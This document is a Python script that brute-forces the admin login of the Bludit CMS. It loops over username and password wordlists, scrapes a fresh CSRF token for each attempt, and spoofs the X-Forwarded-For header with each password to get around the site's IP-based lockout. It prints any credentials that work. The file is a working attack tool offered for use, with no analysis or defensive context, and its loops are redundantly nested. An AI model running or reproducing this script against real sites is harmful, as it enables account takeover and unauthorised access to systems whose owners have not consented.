#!/usr/bin/env python3
import re
import requests
#Upgrade Rastatings Script to take a username and password list
#Brute force script for Bludit Brute Force (bypass CRSF check)
host = 'http://192.168.1.1'
login_url = host + '/admin/logon'
username = 'admin'
wordlist = []

UserList = []
fileName = 'users.txt'
UserList = [line.rstrip('\n') for line in open(fileName)]

for i in UserList:
	username = i
	print(username)
	for user in UserList:

		PasswordList = []
		fileName = 'passwords.txt'
		PasswordList = [line.rstrip('\n') for line in open(fileName)]
		c = 0
		for password in PasswordList:
			c = c + 1
			print(c)
			session = requests.Session()
			login_page = session.get(login_url)
			csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
			print('Trying : '+username)
			print('[*] Trying: {p}'.format(p = password))

			headers = {
				'X-Forwarded-For': password,
				'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
				'Referer': login_url
			    }

			data = {
				'tokenCSRF': csrf_token,
				'username': username,
				'password': password,
				'save': ''
			}

			login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

			if 'location' in login_result.headers:
				if '/admin/dashboard' in login_result.headers['location']:
					print()
					print('SUCCESS: Password found!')
					print('Use {u}:{p} to login.'.format(u = username, p = password))
					print()
					break
